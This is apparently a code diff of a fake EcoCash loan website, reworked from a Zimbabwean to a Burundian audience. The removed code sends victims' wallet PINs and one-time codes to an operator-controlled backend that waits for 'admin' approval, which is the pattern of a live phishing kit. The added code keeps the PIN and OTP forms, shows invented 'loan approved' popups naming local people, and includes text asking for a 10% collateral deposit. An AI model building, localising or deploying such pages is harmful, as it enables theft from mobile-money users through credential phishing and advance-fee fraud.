+      comp_notice: "MENYESHA",
+      comp_text1: "Konti yawe ya EcoCash itegerezwa kuba ikora kandi ifise ingwate y'ubwishingizi",
+      comp_text2: "10% y'inguzanyo wasavye.",
+      comp_text3: "Iyi ngwate isubizwa yose umaze kwishyura inguzanyo.",
+      ld_title: "Ibikorwa vy'Inguzanyo",
+      ld_monthly: "KWISHYURA KW'UKWEZI",
+      ld_term: "IKIRINGO C'INGUZANYO",
+      ld_interest: "INYUNGU",
+      qa_title: "Ibikorwa Vuba",
+      qa_deposit: "Bika Amahera",
+      qa_withdraw: "Kura Amahera",
+      qa_details: "Ibikorwa vy'Inguzanyo",
+      nxt_title: "Intambwe zikurikira:",
+      nxt_desc: "Uzaronka SMS y'ivyerekeye gusohora amahera mu masaha 24.",
+      rth_btn: "Subira Ahatangira",
+      modal_wait: "Nimba unkunda tegereza…",
+      modal_sending: "Turohereza ivyerekeye wewe ngo bigenzurwe",
+      modal_verifying_otp: "Kugenzura OTP",
+      modal_submitting: "Gutuma Ubusabe…",
+      modal_processing: "Tegereza mugihe tutunganya ubusabe bwawe"
     }
   };
 
@@ -920,7 +920,7 @@
     document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
     if (event && event.currentTarget) event.currentTarget.classList.add('active');
     
-    const labels = { en: "🌐 English", sn: "🇿🇼 Shona", nd: "🇿🇼 Ndebele" };
+    const labels = { en: "🌐 English", fr: "🌐 Français", rn: "🇧🇮 Kirundi" };
     document.getElementById('currentLangLabel').textContent = labels[lang];
 
     document.querySelectorAll('[data-i18n]').forEach(el => {
@@ -935,7 +935,7 @@
 
   // STATE MANAGEMENT
   const S = {
-    amt: 1000,
+    amt: 1000000,
     term: '48 Months',
     purpose: '',
     first: '',
@@ -967,413 +967,221 @@
     const t = +document.getElementById('rT').value;
     const r = 0.12 / 12;
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-    document.getElementById('aDisp').textContent = '$' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' ' + (currentLang === 'sn' ? 'mwedzi' : currentLang === 'nd' ? 'izinyanga' : 'months');
-    document.getElementById('mOut').textContent = '$' + m.toFixed(2);
-    document.getElementById('rA').style.setProperty('--pct', ((a-50)/(10000-50)*100).toFixed(1) + '%');
-    document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
+    
+    document.getElementById('aDisp').textContent = "FBu " + a.toLocaleString();
+    document.getElementById('tDisp').textContent = t + " months";
+    document.getElementById('mOut').textContent = "FBu " + Math.round(m).toLocaleString();
+    
+    // update range input css progress bar
+    const pct = ((a - 50000) / (10000000 - 50000)) * 100;
+    document.getElementById('rA').style.setProperty('--pct', pct + '%');
+    const pctT = ((t - 6) / (60 - 6)) * 100;
+    document.getElementById('rT').style.setProperty('--pct', pctT + '%');
   }
 
-  // FORM CONTROLS & VALIDATION
   function normalizePhone(id) {
-    const el = document.getElementById(id);
-    if (el.value.startsWith('0')) {
-      const cursor = el.selectionStart;
-      el.value = el.value.substring(1);
-      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
-    }
-  }
-
-  function showErr(id, msg) {
-    document.getElementById(id + 'Txt').textContent = msg;
-    document.getElementById(id).classList.add('show');
-    document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-  }
-  
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
-  }
-
-  function shakeField(id) {
-    const el = document.getElementById(id);
+    let el = document.getElementById(id);
     if (!el) return;
-    el.style.borderColor = '#e61c24';
-    el.style.boxShadow = '0 0 0 3px rgba(230,28,36,0.15)';
-    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
+    el.value = el.value.replace(/\D/g, '');
+  }
+
+  function clearErr(id) {
+    let box = document.getElementById(id);
+    if (box) box.classList.remove('show');
+  }
+
+  function showErr(id, txtId, msg) {
+    let box = document.getElementById(id);
+    let t = document.getElementById(txtId);
+    if (t) t.textContent = msg;
+    if (box) box.classList.add('show');
   }
 
   function toS2() {
-    const amt     = document.getElementById('s1am').value;
-    const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Please enter a valid loan amount.');
-      shakeField('s1am'); return;
+    let am = +document.getElementById('s1am').value;
+    if (!am || am < 50000) {
+      showErr('s1Err', 's1ErrTxt', 'Please enter a valid loan amount (Minimum FBu 50,000)');
+      return;
     }
-    if (!purpose) {
-      showErr('s1Err', 'Please describe the purpose of your loan.');
-      shakeField('s1pu'); return;
-    }
-    clearErr('s1Err');
-    S.amt     = amt;
-    S.term    = document.getElementById('s1te').value;
-    S.purpose = purpose;
+    S.amt = am;
+    S.term = document.getElementById('s1te').value;
+    S.purpose = document.getElementById('s1pu').value || 'General Loan Purpose';
     goTo('page-step2');
   }
 
   function toS3() {
-    const first = document.getElementById('s2fi').value.trim();
-    const last  = document.getElementById('s2la').value.trim();
-    const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Please enter your first name.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Please enter your last name.');  shakeField('s2la'); return; }
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Please enter a valid phone number.'); shakeField('s2ph'); return;
+    let fi = document.getElementById('s2fi').value.trim();
+    let la = document.getElementById('s2la').value.trim();
+    let ph = document.getElementById('s2ph').value.trim();
+
+    if (!fi || !la) {
+      showErr('s2Err', 's2ErrTxt', 'Please enter your first and last name.');
+      return;
     }
-    clearErr('s2Err');
-    S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = '$' + Number(S.amt).toLocaleString();
+    if (ph.length < 8) {
+      showErr('s2Err', 's2ErrTxt', 'Please enter a valid 8-digit Burundi phone number.');
+      return;
+    }
+
+    S.first = fi;
+    S.last = la;
+    S.phone = '+257' + ph;
+
+    document.getElementById('sA').textContent = "FBu " + S.amt.toLocaleString();
     document.getElementById('sT').textContent = S.term;
-    document.getElementById('sP').textContent = S.purpose || '—';
-    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
+    document.getElementById('sP').textContent = S.purpose;
+    document.getElementById('sN').textContent = fi + ' ' + la;
+
     goTo('page-step3');
   }
 
   function submitApp() {
-    const income = document.getElementById('s3in').value;
-    if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Please enter your annual income.'); shakeField('s3in'); return;
+    let inc = +document.getElementById('s3in').value;
+    if (!inc || inc <= 0) {
+      showErr('s3Err', 's3ErrTxt', 'Please enter a valid annual income.');
+      return;
     }
-    clearErr('s3Err');
 
-    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
     document.getElementById('mSubmit').classList.add('show');
-
+    
+    // Simulate backend submission
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT APPLICATION'; }
       goTo('page-submitted');
-      let c = 3;
-      document.getElementById('rdN').textContent = c;
-      const iv = setInterval(() => {
-        c--;
-        document.getElementById('rdN').textContent = c;
-        if (c <= 0) { clearInterval(iv); goTo('page-login'); }
+      
+      let count = 3;
+      const rdEl = document.getElementById('rdN');
+      const timer = setInterval(() => {
+        count--;
+        if (rdEl) rdEl.textContent = count;
+        if (count <= 0) {
+          clearInterval(timer);
+          goTo('page-login');
+        }
       }, 1000);
     }, 1500);
   }
 
-  function showLoginMsg(text) {
-    document.getElementById('lgMsgTxt').textContent = text;
-    document.getElementById('lgMsg').classList.add('show');
-  }
-  function hideLoginMsg() {
-    document.getElementById('lgMsg').classList.remove('show');
-  }
-
-  function showOtpMsg(type, text) {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-    if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
-    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
+  // LOGIN & OTP & PIN
+  function chkLogin() {
+    let ph = document.getElementById('lgPh').value.trim();
+    let pinBoxes = [document.getElementById('p0').value, document.getElementById('p1').value, document.getElementById('p2').value, document.getElementById('p3').value];
+    let pinFilled = pinBoxes.every(val => val.length === 1);
+    
+    let btn = document.getElementById('bLogin');
+    if (ph.length >= 8 && pinFilled) {
+      btn.classList.add('rdy');
+    } else {
+      btn.classList.remove('rdy');
+    }
   }
 
-  function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-  }
-
-  function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+  function pinMv(el, idx) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && idx < 3) {
+      document.getElementById('p' + (idx + 1)).focus();
+    }
     chkLogin();
   }
 
-  function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
-  }
-
   function togPin() {
-    const eyeIcon = document.getElementById('eyeIcon');
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('p'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
-    });
-    if (eyeIcon) {
-      eyeIcon.classList.toggle('fa-eye');
-      eyeIcon.classList.toggle('fa-eye-slash');
-    }
+    let icon = document.getElementById('eyeIcon');
+    let boxes = [document.getElementById('p0'), document.getElementById('p1'), document.getElementById('p2'), document.getElementById('p3')];
+    let isPass = boxes[0].type === 'password';
+    boxes.forEach(b => b.type = isPass ? 'text' : 'password');
+    icon.className = isPass ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
   }
 
-  async function doLogin() {
-    hideLoginMsg();
-
-    const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
-
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Please enter your phone number and 4-digit PIN.');
+  function doLogin() {
+    let ph = document.getElementById('lgPh').value.trim();
+    if (ph.length < 8) {
+      showErr('lgMsg', 'lgMsgTxt', 'Please enter a valid phone number.');
       return;
     }
-
-    const phoneNumber = '+263' + rawPhone;
-    const adminId = getAdminId();
-
     document.getElementById('mLogin').classList.add('show');
-    document.getElementById('bLogin').disabled = true;
-
-    try {
-      const res = await fetch('/api/verify-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber,
-          pin,
-          adminId: adminId || null,
-          assignmentType: adminId ? 'specific' : 'auto'
-        })
-      });
-
-      const data = await res.json();
+    
+    setTimeout(() => {
       document.getElementById('mLogin').classList.remove('show');
+      document.getElementById('otpPh').textContent = "+257" + ph;
+      goTo('page-otp');
+      startOtpCountdown();
+    }, 1500);
+  }
 
-      if (data.success) {
-        S.applicationId   = data.applicationId;
-        S.assignedAdminId = data.assignedAdminId;
-
-        document.getElementById('otpPh').textContent = phoneNumber;
-        goTo('page-otp');
-        document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
-
-        pollPinStatus();
-
-      } else {
-        document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Verification failed. Please try again.');
-      }
-
-    } catch (err) {
-      document.getElementById('mLogin').classList.remove('show');
-      document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Network error. Please check your connection and try again.');
+  function otpMv(el, idx) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && idx < 5) {
+      document.getElementById('o' + (idx + 1)).focus();
+    }
+    
+    let boxes = [];
+    for(let i=0; i<6; i++) boxes.push(document.getElementById('o'+i).value);
+    let allFilled = boxes.every(v => v.length === 1);
+    let btn = document.getElementById('bOtp');
+    if(allFilled) {
+      btn.classList.add('rdy');
+    } else {
+      btn.classList.remove('rdy');
     }
   }
 
-  let pinPollInterval = null;
-
-  function pollPinStatus() {
-    if (pinPollInterval) clearInterval(pinPollInterval);
-
-    pinPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Details verified! Please enter your 6-digit OTP below.');
-          startRs();
-          document.getElementById('o0').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
-          document.getElementById('bLogin').disabled = false;
-        }
-
-      } catch (e) {}
-    }, 2000);
-
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Verification timed out. Please go back and try again.');
-        }
-      }
-    }, 300000);
-  }
-
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
-  }
-
-  let _rsInterval = null;
-  function startRs() {
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">seconds</span>';
-
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--ecocash-blue);cursor:pointer;font-weight:700" onclick="resendOtp()">Resend code</span>';
+  let otpTimerInterval;
+  function startOtpCountdown() {
+    let sec = 17;
+    const rsS = document.getElementById('rsS');
+    const otpRs = document.getElementById('otpRs');
+    otpRs.style.display = 'block';
+    
+    clearInterval(otpTimerInterval);
+    otpTimerInterval = setInterval(() => {
+      sec--;
+      if (rsS) rsS.textContent = sec;
+      if (sec <= 0) {
+        clearInterval(otpTimerInterval);
+        otpRs.style.display = 'none';
       }
     }, 1000);
   }
 
-  async function resendOtp() {
-    if (!S.applicationId) return;
-    try {
-      const res  = await fetch('/api/resend-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
-      });
-      const data = await res.json();
-      if (data.success) {
-        showOtpMsg('info', 'A new 6-digit OTP request has been sent to the admin.');
-        startRs();
-        [0,1,2,3,4,5].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
-      } else {
-        showOtpMsg('error', 'Could not resend OTP. Please try again.');
-      }
-    } catch {
-      showOtpMsg('error', 'Network error while resending OTP.');
-    }
-  }
+  function doOtp() {
+    let boxes = [];
+    for(let i=0; i<6; i++) boxes.push(document.getElementById('o'+i).value);
+    if(!boxes.every(v => v.length === 1)) return;
 
-  async function doOtp() {
-    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 6) {
-      showOtpMsg('warning', 'Please enter all 6 digits of your OTP.');
-      return;
-    }
-
-    hideOtpMsgs();
-
-    let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
-    document.getElementById('bOtp').disabled = true;
-
-    const countdown = setInterval(() => {
-      c--;
-      const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Please wait… (' + c + 's)';
-    }, 1000);
-
-    try {
-      const res  = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
-      });
-      const data = await res.json();
-
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-
-      if (data.success) {
-        showOtpMsg('success', 'OTP submitted. Waiting for admin to approve…');
-        pollOtpStatus();
-      } else {
-        document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Failed to submit OTP. Please try again.');
-      }
-
-    } catch (err) {
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-      document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error. Please check your connection.');
-    }
-  }
-
-  let otpPollInterval = null;
-
-  function pollOtpStatus() {
-    if (otpPollInterval) clearInterval(otpPollInterval);
-
-    otpPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = '$' + Number(S.amt || 1000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || '48 Months';
-          const a = Number(S.amt) || 1000;
-          const t = parseInt(S.term) || 48;
-          const r = 0.12 / 12;
-          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = '$' + m.toFixed(2);
-          goTo('page-approval');
-
-        } else if (data.status === 'rejected') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
-          document.getElementById('bOtp').disabled = false;
-
-        } else if (data.status === 'wrongpin_otp') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
-          setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
-            [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">seconds</span>';
-            hideOtpMsgs();
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
-
-        } else if (data.status === 'wrongcode') {
-          clearInterval(otpPollInterval);
-          [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
-          document.getElementById('o0').focus();
-        }
-
-      } catch (e) {}
-    }, 2000);
-
+    
     setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Approval timed out. Please try again.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
+      document.getElementById('mOtp').classList.remove('show');
+      // Populate approval data
+      document.getElementById('apAmt').textContent = "FBu " + S.amt.toLocaleString();
+      let monthly = Math.round((S.amt * 0.12 / 12) / (1 - Math.pow(1 + 0.12/12, -48)));
+      document.getElementById('apMthly').textContent = "FBu " + monthly.toLocaleString();
+      document.getElementById('apTerm').textContent = S.term;
+      
+      goTo('page-approval');
+    }, 2000);
   }
+
+  // Live Notification Popups simulator
+  const popupNames = ["Jean-Claude", "Marie", "Didier", "Chantal", "Aline", "Emmanuel", "Pacifique"];
+  function showLivePopup() {
+    const p = document.getElementById('popup');
+    if (!p) return;
+    const name = popupNames[Math.floor(Math.random() * popupNames.length)];
+    const amt = (Math.floor(Math.random() * 40) + 10) * 100000;
+    
+    document.getElementById('popup-avatar').textContent = name.substring(0,2).toUpperCase();
+    document.getElementById('popup-text').innerHTML = `<strong>${name}</strong> from Bujumbura just got a loan of <strong>FBu ${amt.toLocaleString()}</strong> approved!`;
+    
+    p.classList.add('show');
+    setTimeout(() => {
+      p.classList.remove('show');
+    }, 4000);
+  }
+
+  setInterval(showLivePopup, 12000);
+  setTimeout(showLivePopup, 3000);
 </script>
 </body>
 </html>
+```[cite: 1]
